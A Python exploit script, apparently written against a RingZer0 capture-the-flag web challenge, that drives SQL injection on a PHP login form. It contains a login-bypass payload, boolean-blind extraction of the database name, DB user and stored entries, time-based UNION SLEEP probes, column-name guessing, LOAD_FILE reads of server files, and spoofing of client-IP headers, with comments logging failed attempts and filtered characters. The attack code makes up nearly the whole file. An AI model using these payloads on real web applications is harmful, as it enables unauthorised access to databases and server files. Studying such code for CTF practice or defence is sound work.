from random import randint
import requests
from time import time, sleep
import matplotlib.pyplot as plt
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://challenges.ringzer0team.com:10273"

with open("myip.txt", "r") as myip_f:
    MYIP = myip_f.read()

CHS = [i for i in range(0x20, 0x7f)]

BYPASS_LOGIN = "'/**/OR/**/1#"

def str_to_hexrep(s):

    hr = 0

    i = 0
    while i < len(s):

        hr += ord(s[i])
        hr <<= 8

        i += 1

    hr >>= 8
    hr = hex(hr)

    return hr

def req_login(username, password, sessid):

    res = requests.post(url=f"{TARGET}", 
                        data={"username": username,
                                "password": password}, 
                        cookies={"PHPSESSID": sessid}
                        )

    return res.status_code, res.content

def req_logs(password, sessid):

    res = requests.post(url=f"{TARGET}/logs.php", 
                        data={"password": password}, 
                        cookies={"PHPSESSID": sessid}
                        )
    return res.status_code, res.content

def try_adminpass_chars(sessid):

    L = 3

    def cart_prod(idx):

        if idx == 0:
            yield ""
            return

        for c in CHS:
            for ch_seq in cart_prod(idx - 1):
                yield ch_seq + chr(c)

    with ThreadPoolExecutor(max_workers = 32) as threadpool:

        res = \
        {
            l:
            {
                ch_seq: None
                for ch_seq in cart_prod(l)
            }
            for l in range(L)
        }

        for l in range(L):
            for ch_seq in cart_prod(l):
                res[l][ch_seq] = threadpool.submit(req_logs, ch_seq, sessid)

        for l in range(L):
            print(f"l={l}")

            for ch_seq in cart_prod(l):
                
                res[l][ch_seq] = res[l][ch_seq].result()
                _, content = res[l][ch_seq]

                if b"Try all you like, that's the wrong admin password..." in content:
                    continue

                else:
                    print(f"unknown response for s={ch_seq}")

def try_sessid_injection(sessid):

    def _trychars():

        # default
        default_code, default = req_logs("", "a" * 26)

        for ch_code in CHS:
            code, res = req_logs("", chr(ch_code))

            if code != default_code:
                print(f"code {code} for char {ch_code}")

            if res != default:
                print(f"res != default for char {ch_code}")

        print('done')

    def _tryconcat():

        inj = "' OR 1=0#"
        inj = "' OR 1=1#"
        inj = "%27 OR 1=1 #"
        inj = "%2527 OR 1=1 #"
        inj = "') OR 1=1 #"
        inj = "'#"
        inj = "' UNION SELECT NULL,NULL,SLEEP(5),NULL,NULL -- -"
        inj = "' UNION SELECT SLEEP(5) -- -"
        inj = "' OR 1=1 OR '"
        inj = "') OR 1=1 OR ('"
        inj = "' OR SLEEP(5) #"
        inj = "') UNION SELECT NULL,NULL,SLEEP(5) #"

        inj = inj.replace(" ", "/**/")

        code, res = req_login(BYPASS_LOGIN, "", f"{sessid}{inj}")

        print(code)
        print(res, end="\n\n-------------------\n\n")

        code, res = req_logs("", sessid)
        code_inj, res_inj = req_logs("", f"{sessid}{inj}")

        print(code, code_inj)
        print(res, end="\n\n\n")
        print(res_inj, end="\n\n\n")

    def _trybylogin():

        pad = "injection"

        for _ in range(1):
            req_login(BYPASS_LOGIN, "sessid_repeated2", f"{pad}")

    # _trychars()
    # _tryconcat()

    # ok so it is trybylogin
    # _trybylogin()

    def _trybylogin_seq():

        L = 2

        def cart_prod(idx):

            if idx == 0:
                yield ""
                return

            for c in CHS:
                for ch_seq in cart_prod(idx - 1):
                    yield ch_seq + chr(c)

        sessid_tag = b"<td class='second'>"
        sessid_end_tag = b"</td>"

        with open("sessid_seq.txt", "w+") as fout:
            with ThreadPoolExecutor(max_workers = 32) as threadpool:

                rs =    {
                            l:
                            {
                                inj: None
                                for inj in cart_prod(l)
                            }
                            for l in range(L)
                        }

                for l in range(L):   
                    for sessid_injection in cart_prod(l):
                        rs[l][sessid_injection] = threadpool.submit(req_login, BYPASS_LOGIN, "test4", sessid_injection)

                for l in range(L):
                    print(f"l={l}")
                    for sessid_injection in cart_prod(l):

                        _, res = rs[l][sessid_injection]

                        sessid_start = len(res) - res[::-1].find(sessid_tag[::-1])
                        sessid_ = res[sessid_start:]

                        sessid_end = sessid_.find(sessid_end_tag)
                        sessid_ = sessid_[:sessid_end]

                        print(f"injection={sessid_injection} sessid={sessid_}", file=fout)

    # _trybylogin_seq()

    return

def database_name(sessid):

    with ThreadPoolExecutor(max_workers = 32) as threadpool:

        # database name length

        length = ''

        for i in range(3):

            bools = {ch_ord: False for ch_ord in CHS}
            for ch_ord in CHS:

                inj = f"'/**/OR/**/0=STRCMP(ORD(SUBSTRING(LENGTH(database()),{i + 1},1)),{ch_ord})#"
                bools[ch_ord] = threadpool.submit(req_login, inj, "", sessid)

            for ch_ord in CHS:

                _, res = bools[ch_ord].result()

                if b"Wrong username/password ..." in res:
                    continue
                
                elif b"The right isn't yours to use these !" in res:
                    print(f"failed filtering for char {hex(ch_ord)}")

                elif b"You is hacking us ? We know where you are !" in res:
                    length += chr(ch_ord)
                    print(ch_ord)
                    break

                else:
                    print(f"unknown response for char {hex(ch_ord)}")

        print(f"LENGTH(database())={length}")

        # database name

        dbname = ''

        length = int(length, 10)
        for i in range(length):

            bools = {ch_ord: False for ch_ord in CHS}
            for ch_ord in CHS:

                inj = f"'/**/OR/**/0=STRCMP(ORD(SUBSTRING(database(),{i + 1},1)),{ch_ord})#"
                bools[ch_ord] = threadpool.submit(req_login, inj, "", sessid)

            for ch_ord in CHS:

                _, res = bools[ch_ord].result()

                if b"Wrong username/password ..." in res:
                    continue
                
                elif b"The right isn't yours to use these !" in res:
                    print(f"failed filtering for char {hex(ch_ord)}")

                elif b"You is hacking us ? We know where you are !" in res:
                    dbname += chr(ch_ord)
                    print(ch_ord)
                    break

                else:
                    print(f"unknown response for char {hex(ch_ord)}")

        print(f"database()={dbname}")

    return dbname

def user_name(sessid):

    with ThreadPoolExecutor(max_workers = 32) as threadpool:

        # user name length

        length = ''

        for i in range(3):

            bools = {ch_ord: False for ch_ord in CHS}
            for ch_ord in CHS:

                inj = f"'/**/OR/**/0=STRCMP(ORD(SUBSTRING(LENGTH(user()),{i + 1},1)),{ch_ord})#"
                bools[ch_ord] = threadpool.submit(req_login, inj, "", sessid)

            for ch_ord in CHS:

                _, res = bools[ch_ord].result()

                if b"Wrong username/password ..." in res:
                    continue
                
                elif b"The right isn't yours to use these !" in res:
                    print(f"failed filtering for char {hex(ch_ord)}")

                elif b"You is hacking us ? We know where you are !" in res:
                    length += chr(ch_ord)
                    print(ch_ord)
                    break

                else:
                    print(f"unknown response for char {hex(ch_ord)}")

        print(f"LENGTH(user())={length}")

        # user name

        user = ''

        length = int(length, 10)
        for i in range(length):

            bools = {ch_ord: False for ch_ord in CHS}
            for ch_ord in CHS:

                inj = f"'/**/OR/**/0=STRCMP(ORD(SUBSTRING(user(),{i + 1},1)),{ch_ord})#"
                bools[ch_ord] = threadpool.submit(req_login, inj, "", sessid)

            for ch_ord in CHS:

                _, res = bools[ch_ord].result()

                if b"Wrong username/password ..." in res:
                    continue
                
                elif b"The right isn't yours to use these !" in res:
                    print(f"failed filtering for char {hex(ch_ord)}")

                elif b"You is hacking us ? We know where you are !" in res:
                    user += chr(ch_ord)
                    print(ch_ord)
                    break

                else:
                    print(f"unknown response for char {hex(ch_ord)}")

        print(f"database()={user}")

    return user

def various(sessid):

    #inj = " OR SLEEP(10) OR "

    #inj = inj.replace(" ", "/**/")

    _, res = req_login(b"", "DyrhGOYP0vxI2DtH8y", sessid)

    if b"Wrong username/password ..." in res:
        print("wrong")

    elif b"The right isn't yours to use these !" in res:
        print("filtered")

    elif b'You is hacking us ? We know where you are !' in res:
        print("logs")

    else:
        print("unknown response")

    '''if b"Try all you like, that's the wrong admin password..." in res:
        print("wrong")

    elif b"Admin panel" in res:
        print("login panel")
        
    else:
        print(f"unknown response")'''

def try_spoof_addr(sessid):

    HEADERS_WEBSCRAP_ADDR = "https://udger.com/resources/http-request-headers"

    res = requests.get(url=HEADERS_WEBSCRAP_ADDR)
    res = res.text

    HEADER_NAME_PREFIX = "/resources/http-request-headers-detail?header="

    '''
    HEADERS = \
            {
                "X-Forwarded-For": SPOOFED_ADDR,
                "X-Forwarded-By": SPOOFED_ADDR,
                "X-Originating-IP": SPOOFED_ADDR,
                "X-Remote-IP": SPOOFED_ADDR,
                "X-Remote-Addr": SPOOFED_ADDR,
                "X-Forwarded-Host": SPOOFED_ADDR,
                "X-Real-Ip": SPOOFED_ADDR
            }
    '''

    header_names = []
    while True:

        idx = res.find(HEADER_NAME_PREFIX)

        if idx == -1:
            break

        res = res[idx + len(HEADER_NAME_PREFIX):]
        header_names.append(res[:res.find("\">")])

    #print("X-Forwarded-For" in header_names)

    SPOOFED_ADDR = f"127.0.0.1"
    SPOOFED_ADDR = SPOOFED_ADDR.replace(" ", "/**/")

    def _try_header_name(name):

        HEADERS = \
        {
            name: SPOOFED_ADDR
        }

        res = requests.post(url=f"{TARGET}",
                            headers=HEADERS,
                            data={"username": BYPASS_LOGIN,
                                    "password": f"ASD{randint(1, 100000)}"},
                            cookies={"PHPSESSID": sessid}
                            )

        res = requests.get(url=f"{TARGET}/logs.php",
                            headers=HEADERS,
                            cookies={"PHPSESSID": BYPASS_LOGIN})

        if SPOOFED_ADDR in res.text:
            print(f"found while trying header_name={name}|")
            print(res.text)

    with ThreadPoolExecutor(max_workers=64) as threadpool:
        for header_name in header_names:
            threadpool.submit(_try_header_name, header_name)            

    print("done")
    return
    print("\n\n====================================\n\n")

    

    print(res_get.text)

def try_request_index(sessid):

    res = requests.get(url=f"{TARGET}",
                        cookies={"PHPSESSID": "--OR'fakesession'"})

    print(res.status_code)

    print(res.text)

def try_injection_byhash(sessid):

    md5_qorq5 = "DyrhGOYP0vxI2DtH8y"
    sha1_qorq = "eww2uw593z"
    sha1_qorq = "n6uipva4ww"

    to_be_hashed = sha1_qorq

    # also tried req_logs 
    # no luck

    code, res = req_login(BYPASS_LOGIN, to_be_hashed, f"{sessid}")

    print(code)

    print(res)

def try_heavyquery_stringcmp(sessid):

    L = 100000
    #L = 100

    c = "a"

    s1 = "a" * L * 2
    s2 = "a" * (L - 1) + c + "a" * L

    t = time()
    _, res = req_login(f"'OR/**/1=IF('{s1}'='{s2}',1,2)#", "", sessid)
    t = time() - t

    print(res)
    print(f"-------{t}-------")

def try_adminpass(sessid):

    for k in range(10):
        for p in range(6):

            nulls = ",NULL" * k
            brackets = ")" * p

            inj = f"'{brackets}/**/UNION/**/SELECT/**/SLEEP(5){nulls}#"

            _, res = req_logs(inj, sessid)

            if b"Try all you like, that's the wrong admin password..." in res:
                pass

            else:
                print(f"unknown response k={k},p={p}")

    _, res = req_logs("A'+SLEEP(3)", sessid)

    if b"Try all you like, that's the wrong admin password..." in res:
        pass

    else:
        print(f"unknown response k={k},p={p}")

def bruteforce_column_name_login(sessid):

    # we know there is only one column by inserting ORDER BY / GROUP BY
    # try to guess it and then leak the real username(s) from DB

    for column_guess in ["username",
                            "user",
                            "admin",
                            "id",
                            "name",
                            "Username",
                            "user_name"
                            "entry",
                            "lastName",
                            "firstName",
                            "logger",
                            "log",
                            "player",
                            "sqli",
                            "rektChalUser",
                            "rektChalUsername",
                            "USERNAME",
                            "USER",
                            "NAME",
                            "ID",
                            "ADMIN",
                            "ENTRY",
                            "PLAYER",
                            "SQLI",
                            "u",
                            "U",
                            "administrator",
                            "ADMINISTRATOR"]:

        inj = f"'OR/**/{column_guess}={column_guess}#"

        _, res = req_login(inj, "", sessid)

        if b"Wrong username/password ..." in res:
            continue

        elif b"The right isn't yours to use these !" in res:
            print("filtered")

        elif b'You is hacking us ? We know where you are !' in res:
            print(f"column name is {column_guess}")
            break

def read_file(sessid, filepath="", local_path="sqhell_file"):

    # test with this query for true
    # f"'OR/**/0=STRCMP(ORD(SUBSTRING((LENGTH('asd')),1,1)),51)#", "", sessid) #

    with ThreadPoolExecutor(max_workers = 64) as threadpool:

        page_len = ''

        MAX_LEN_DIGITS = 5
        for i in range(MAX_LEN_DIGITS):

            valid = False
        
            ans = {c_ord: None for c_ord in CHS}

            for c_ord in ans.keys():
                ans[c_ord] = threadpool.submit(req_login, f"'OR/**/0=STRCMP(ORD(SUBSTRING((LENGTH(LOAD_FILE('{filepath}'))),{i + 1},1)),{c_ord})#", "", sessid)
            
            for c_ord in ans.keys():

                _, res = ans[c_ord].result()
                if b"You is h" in res:

                    page_len += f'{chr(c_ord)}'
                    valid = True
                    break

                elif b"Wrong username/password ..." in res:
                    continue

                elif b"The right isn't yours to use these !" in res:
                    print("filtered")

                else:
                    print("unknown response")

            if valid is False:
                break

        print(f"raw page len {page_len}")
        page_len = int(page_len, 10)
        print(f'page length {page_len}')

        valid = False

        page_contents = ''
        for i in range(page_len):

            ans = {c_ord: None for c_ord in CHS}

            for c_ord in ans.keys():
                ans[c_ord] = threadpool.submit(req_login, f"'OR/**/0=STRCMP(ORD(SUBSTRING((LOAD_FILE('{filepath}')),{i + 1},1)),{c_ord})#", "", sessid)

            for c_ord in ans.keys():
                if ans[c_ord].result() is False:

                    print(chr(c_ord), end="", flush=True)

                    page_contents += f'{chr(c_ord)}'
                    valid = True
                    break

            if valid is False:
                print("ERROR")
                quit()

        print("done")

        with open(local_path, "w+") as f:
            f.write(page_contents)
        
        return page_contents

def test_loginpass_variations(sessid):

    L = 2

    def cart_prod(idx):

        if idx == 0:
            yield ""
            return

        for c in CHS:
            for ch_seq in cart_prod(idx - 1):
                yield ch_seq + chr(c)

    def _check_res(ch_seq):

        _, content = req_login(b"'OR'1'OR'", f"'{ch_seq}", sessid)

        if b"Wrong username/password ..." in content:
            print(f"wrong for ch_seq={ch_seq}|")

        elif b"The right isn't yours to use these !" in content:
            #print(f"filtered for ch_seq={ch_seq}|")
            pass

        elif b'You is hacking us ? We know where you are !' in content:
            #print("logs")
            pass

        else:
            print(f"unknown response for ch_seq={ch_seq}|")

    with ThreadPoolExecutor(max_workers = 64) as threadpool:

        res = \
        {
            l:
            {
                ch_seq: None
                for ch_seq in cart_prod(l)
            }
            for l in range(L + 1)
        }

        for l in range(L + 1):
            for ch_seq in cart_prod(l):
                res[l][ch_seq] = threadpool.submit(_check_res, ch_seq)

def try_var_dump(sessid):

    # does NOT work
    # nested select ????

    entry_cnt = 0
    while True:

        _, res = req_login(f"'OR'1'/**/LIMIT/**/{entry_cnt},1#", "", sessid)

        if b'You is hacking us ? We know where you are !' not in res:
            break

        entry_cnt += 1

    print(f"entry count {entry_cnt}")

    for entry_idx in range(entry_cnt):
        req_login(f"'OR'1'/**/LIMIT/**/{entry_idx},1/**/INTO/**/@vuacc{entry_idx}#", "", sessid)

    with ThreadPoolExecutor(max_workers=64) as threadpool:

        for entry_idx in range(entry_cnt):

            entry_len = ''

            MAX_LEN_DIGITS = 4
            for i in range(MAX_LEN_DIGITS):

                valid = False
            
                ans = {c_ord: None for c_ord in CHS}

                for c_ord in ans.keys():
                    ans[c_ord] = threadpool.submit(req_login, f"'OR/**/0=STRCMP(ORD(SUBSTRING((LENGTH(@vuacc{entry_idx})),{i + 1},1)),{c_ord})#", "", sessid)
                
                for c_ord in ans.keys():

                    _, res = ans[c_ord].result()
                    if b"You is h" in res:

                        entry_len += f'{chr(c_ord)}'
                        valid = True
                        break

                    elif b"Wrong username/password ..." in res:
                        continue

                    elif b"The right isn't yours to use these !" in res:
                        print("filtered")

                    else:
                        print("unknown response")

                if valid is False:
                    break

            entry_len = int(entry_len, 10)
            print(f"entry {entry_idx} len {entry_len}")

            valid = False

            entry_contents = ''
            for i in range(entry_len):

                ans = {c_ord: None for c_ord in CHS}

                for c_ord in ans.keys():
                    ans[c_ord] = threadpool.submit(req_login, f"'OR/**/0=STRCMP(ORD(SUBSTRING((@vuacc{entry_idx}),{i + 1},1)),{c_ord})#", "", sessid)

                for c_ord in ans.keys():
                    if ans[c_ord].result() is False:

                        print(chr(c_ord), end="", flush=True)

                        entry_contents += f'{chr(c_ord)}'
                        valid = True
                        break

                if valid is False:
                    print("ERROR")
                    quit()

            print(f"entry {entry_idx} contents:{entry_contents}|")    

def start(sessid):

    # try_sessid_injection(sessid)    
    # will come back to this
    # session id accets only alphanumeric , -
    
    # dont know what to do next
    # at least leak db name
    # dbname = database_name(sessid)
    dbname = "rektChalDB"

    # leak username
    # username = user_name(sessid)
    username = "rektChal@localhost"

    # try_adminpass_chars(sessid)
    # no luck

    # some tests
    # various(sessid)

    # try to spoof http_remote_addr
    # try_spoof_addr(sessid)
    # no luck

    # try to request index fake sessid
    # try_request_index(sessid)
    # expected, nothing unusual happens

    # try injection by hashing (sort of...)
    # try_injection_byhash(sessid)

    # req_login(b"'OR/**/1/**/ORDER/**/BY/**/1#", "", sessid)
    # order by 1 gives logs, order by (anything else) does not
    # => first query only checks for username

    # limits strings to length 200?
    #try_heavyquery_stringcmp(sessid)

    # fail
    # so iti is either hashed
    # or escaped
    # or invulnerable
    # try_adminpass(sessid)

    # fail
    # bruteforce_column_name_login(sessid)

    # various(sessid)

    # fail
    # read_file(sessid, "/var/www/html/index.php", "sqhell_index.php")

    # 'OR/**/logs.Input='asd::'# fail 

    # try to spoof addr again
    # try_spoof_addr(sessid)
    # fail again

    # test_loginpass_variations(sessid)
    # no variation - either filtered or no username disturbance

    # various(sessid)

    # try to spoof addr again
    # try_spoof_addr(sessid)
    # yet another fail

    # print(str_to_hexrep("/tmp/lol2"))

    try_var_dump(sessid)

    return

# at index.php, cannot use:

# sleep
# (space)
# select*
# +

if __name__ == "__main__":
    start("sessid")